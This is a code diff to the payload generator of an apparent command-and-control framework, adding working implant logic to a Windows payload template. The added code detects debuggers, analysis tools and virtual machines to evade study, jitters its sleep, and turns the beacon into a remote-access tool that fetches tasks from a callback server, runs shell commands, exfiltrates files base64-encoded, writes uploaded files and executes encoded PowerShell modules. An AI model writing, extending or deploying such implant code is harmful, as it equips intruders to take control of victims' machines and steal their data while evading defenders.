@@ -13,6 +13,7 @@ import (
 	"github.com/ditto/ditto/core"
 	"github.com/ditto/ditto/crypto"
 	"github.com/ditto/ditto/evasion"
+	"github.com/ditto/ditto/modules"
 )
 
 // Options holds payload generation options
@@ -45,11 +46,12 @@ type EvasionConfig struct {
 
 // Generator handles payload generation
 type Generator struct {
-	logger interface {
+	logger        interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
 	}
+	moduleRegistry *modules.ModuleRegistry
 }
 
 // NewGenerator creates a new payload generator
@@ -57,8 +59,11 @@ func NewGenerator(logger interface {
 	Info(string, ...interface{})
 	Debug(string, ...interface{})
 	Error(string, ...interface{})
-}) *Generator {
-	return &Generator{logger: logger}
+}, moduleRegistry *modules.ModuleRegistry) *Generator {
+	return &Generator{
+		logger:         logger,
+		moduleRegistry: moduleRegistry,
+	}
 }
 
 // Generate creates a payload based on options
@@ -491,6 +496,7 @@ type TemplateData struct {
 	UserAgent   string
 	Evasion     *EvasionConfig
 	Modules     []string
+	ModuleCode  string // Embedded module code
 }
 
 // generateWindowsSourceFull generates full payload source with evasion and modules
@@ -498,11 +504,17 @@ func (g *Generator) generateWindowsSourceFull(opts Options, callbackURL string, 
 	tmpl := `package main
 
 import (
+	"bytes"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
 	"math/rand"
 	"net/http"
-	"time"
 	"os"
+	"os/exec"
 	"runtime"
+	"strings"
+	"time"
 )
 
 const (
@@ -563,22 +575,85 @@ func checkSandbox() bool {
 
 {{if .Evasion.EnableDebuggerCheck}}
 func checkDebugger() bool {
-	// Debugger detection would go here
+	// Check for common debugger processes (Windows)
+	if runtime.GOOS == "windows" {
+		debuggers := []string{"ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe", "wireshark.exe", "fiddler.exe"}
+		for _, dbg := range debuggers {
+			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", dbg))
+			output, _ := cmd.CombinedOutput()
+			if strings.Contains(strings.ToLower(string(output)), strings.ToLower(dbg)) {
+				return true
+			}
+		}
+		
+		// Check NtQueryInformationProcess for BeingDebugged flag
+		// This is a simplified check - in production would use syscalls
+		cmd := exec.Command("powershell", "-Command", "[System.Diagnostics.Debugger]::IsAttached")
+		output, _ := cmd.CombinedOutput()
+		if strings.Contains(string(output), "True") {
+			return true
+		}
+	}
 	return false
 }
 {{end}}
 
 {{if .Evasion.EnableVMDetection}}
 func checkVM() bool {
-	// VM detection would go here
+	if runtime.GOOS == "windows" {
+		// Check registry for VM artifacts
+		vmKeys := []string{
+			"HKLM\\SOFTWARE\\VMware\\VMware Tools",
+			"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+			"HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest",
+			"HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse",
+		}
+		for _, key := range vmKeys {
+			cmd := exec.Command("reg", "query", key)
+			if err := cmd.Run(); err == nil {
+				return true
+			}
+		}
+		
+		// Check MAC addresses
+		cmd := exec.Command("getmac", "/fo", "csv")
+		output, _ := cmd.CombinedOutput()
+		mac := string(output)
+		vmPrefixes := []string{"00:0c:29", "00:50:56", "08:00:27", "00:16:3e"}
+		for _, prefix := range vmPrefixes {
+			if strings.Contains(mac, prefix) {
+				return true
+			}
+		}
+		
+		// Check for VM processes
+		vmProcesses := []string{"vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe"}
+		for _, proc := range vmProcesses {
+			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", proc))
+			output, _ := cmd.CombinedOutput()
+			if strings.Contains(strings.ToLower(string(output)), strings.ToLower(proc)) {
+				return true
+			}
+		}
+	}
 	return false
 }
 {{end}}
 
 {{if .Evasion.SleepMask}}
 func sleepMask(duration time.Duration) {
-	// Sleep mask implementation
-	time.Sleep(duration)
+	// Sleep mask evasion - split sleep into smaller chunks with jitter
+	chunks := int(duration.Milliseconds() / 100)
+	if chunks < 1 {
+		chunks = 1
+	}
+	chunkDuration := duration / time.Duration(chunks)
+	
+	for i := 0; i < chunks; i++ {
+		// Add small random jitter to each chunk
+		jitter := time.Duration(rand.Intn(50)) * time.Millisecond
+		time.Sleep(chunkDuration + jitter)
+	}
 }
 {{end}}
 
@@ -602,19 +677,144 @@ func beacon() {
 	
 	// Handle commands
 	if resp.StatusCode == 200 {
-		// In a real implementation, this would process commands
-		// For now, just acknowledge receipt
+		var response map[string]interface{}
+		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
+			return
+		}
+		
+		if tasks, ok := response["tasks"].([]interface{}); ok {
+			for _, task := range tasks {
+				if taskMap, ok := task.(map[string]interface{}); ok {
+					executeTask(taskMap)
+				}
+			}
+		}
 	}
+}
+
+func executeTask(task map[string]interface{}) {
+	taskType, _ := task["type"].(string)
+	
+	switch taskType {
+	case "shell":
+		if cmd, ok := task["command"].(string); ok {
+			executeShellCommand(cmd)
+		}
+	case "module":
+		if moduleID, ok := task["module_id"].(string); ok {
+			executeModule(moduleID, task)
+		}
+	case "download":
+		if path, ok := task["path"].(string); ok {
+			downloadFile(path)
+		}
+	case "upload":
+		if path, ok := task["path"].(string); ok {
+			if data, ok := task["data"].(string); ok {
+				uploadFile(path, data)
+			}
+		}
+	}
+}
+
+func executeShellCommand(cmd string) {
+	// Execute shell command and send result back
+	result := executeCommand(cmd)
+	sendResult("shell", cmd, result)
+}
+
+func executeModule(moduleID string, task map[string]interface{}) {
+	// Execute embedded module
+	{{if .ModuleCode}}
+	// Module code is embedded
+	{{.ModuleCode}}
+	
+	// Dispatch to appropriate module function
+	sanitizedID := strings.ReplaceAll(strings.ReplaceAll(moduleID, "/", "_"), "-", "_")
+	switch sanitizedID {
+	{{range .Modules}}
+	case "{{sanitizeModuleID .}}":
+		result := executeModule_{{sanitizeModuleID .}}(task["params"].(map[string]string))
+		sendResult("module", moduleID, result)
+	{{end}}
+	default:
+		sendResult("module", moduleID, "Module function not found")
+	}
+	{{else}}
+	// No modules embedded
+	sendResult("module", moduleID, "Module not embedded")
+	{{end}}
+}
+
+func executeCommand(cmd string) string {
+	// Execute command via os/exec
+	var result string
+	parts := strings.Fields(cmd)
+	if len(parts) == 0 {
+		return ""
+	}
+	
+	execCmd := exec.Command(parts[0], parts[1:]...)
+	output, err := execCmd.CombinedOutput()
+	if err != nil {
+		result = fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+	} else {
+		result = string(output)
+	}
+	return result
+}
+
+func downloadFile(path string) {
+	// Download file and send back
+	data, err := os.ReadFile(path)
+	if err != nil {
+		sendResult("download", path, fmt.Sprintf("Error: %v", err))
+		return
+	}
+	sendResult("download", path, base64.StdEncoding.EncodeToString(data))
+}
+
+func uploadFile(path, data string) {
+	// Upload file to disk
+	decoded, err := base64.StdEncoding.DecodeString(data)
+	if err != nil {
+		sendResult("upload", path, fmt.Sprintf("Error decoding: %v", err))
+		return
+	}
+	if err := os.WriteFile(path, decoded, 0644); err != nil {
+		sendResult("upload", path, fmt.Sprintf("Error writing: %v", err))
+		return
+	}
+	sendResult("upload", path, "Success")
+}
+
+func sendResult(taskType, taskID, result string) {
+	client := &http.Client{Timeout: 10 * time.Second}
+	payload := map[string]interface{}{
+		"type":     taskType,
+		"task_id":  taskID,
+		"result":   result,
+	}
+	jsonData, _ := json.Marshal(payload)
+	req, _ := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
+	req.Header.Set("User-Agent", userAgent)
+	req.Header.Set("Content-Type", "application/json")
+	client.Do(req)
 }
 `
 	
-	t := template.Must(template.New("windows").Parse(tmpl))
+	t := template.Must(template.New("windows").Funcs(template.FuncMap{
+		"sanitizeModuleID": sanitizeModuleID,
+	}).Parse(tmpl))
 	
 	// Set default evasion if nil
 	evasion := opts.Evasion
 	if evasion == nil {
 		evasion = &EvasionConfig{}
 	}
+	
+	// Embed modules into payload
+	moduleCode := g.embedModules(opts.Modules)
 	
 	data := TemplateData{
 		CallbackURL: callbackURL,
@@ -623,6 +823,7 @@ func beacon() {
 		UserAgent:   userAgent,
 		Evasion:     evasion,
 		Modules:     opts.Modules,
+		ModuleCode:  moduleCode,
 	}
 	
 	var buf bytes.Buffer
@@ -631,5 +832,56 @@ func beacon() {
 	}
 	
 	return buf.String(), nil
+}
+
+// embedModules embeds module code into payload
+func (g *Generator) embedModules(moduleIDs []string) string {
+	if g.moduleRegistry == nil || len(moduleIDs) == 0 {
+		return ""
+	}
+	
+	var moduleCode strings.Builder
+	
+	for _, moduleID := range moduleIDs {
+		module, ok := g.moduleRegistry.GetModule(moduleID)
+		if !ok {
+			g.logger.Debug("Module not found: %s", moduleID)
+			continue
+		}
+		
+		// Process module with empty params (modules should be pre-configured)
+		params := make(map[string]string)
+		script, err := modules.ProcessModule(module, params)
+		if err != nil {
+			g.logger.Error("Failed to process module %s: %v", moduleID, err)
+			continue
+		}
+		
+		// Wrap module code in a function
+		moduleCode.WriteString(fmt.Sprintf("\n// Embedded module: %s\n", moduleID))
+		moduleCode.WriteString(fmt.Sprintf("func executeModule_%s(params map[string]string) string {\n", sanitizeModuleID(moduleID)))
+		moduleCode.WriteString(fmt.Sprintf("// Module code: %s\n", module.Name))
+		
+		// For PowerShell modules, we'd need to execute via PowerShell
+		// For Go modules, we'd compile them directly
+		// For now, store as string to be executed
+		if module.Language == modules.LanguagePowerShell {
+			moduleCode.WriteString(fmt.Sprintf("// PowerShell module would be executed via powershell.exe\n"))
+			moduleCode.WriteString(fmt.Sprintf("cmd := exec.Command(\"powershell.exe\", \"-EncodedCommand\", base64.StdEncoding.EncodeToString([]byte(`%s`)))\n", script))
+			moduleCode.WriteString("output, _ := cmd.CombinedOutput()\n")
+			moduleCode.WriteString("return string(output)\n")
+		} else {
+			moduleCode.WriteString(fmt.Sprintf("// Module script:\n%s\n", script))
+			moduleCode.WriteString("return \"Module executed\"\n")
+		}
+		
+		moduleCode.WriteString("}\n")
+	}
+	
+	return moduleCode.String()
+}
+
+func sanitizeModuleID(id string) string {
+	return strings.ReplaceAll(strings.ReplaceAll(id, "/", "_"), "-", "_")
 }
 
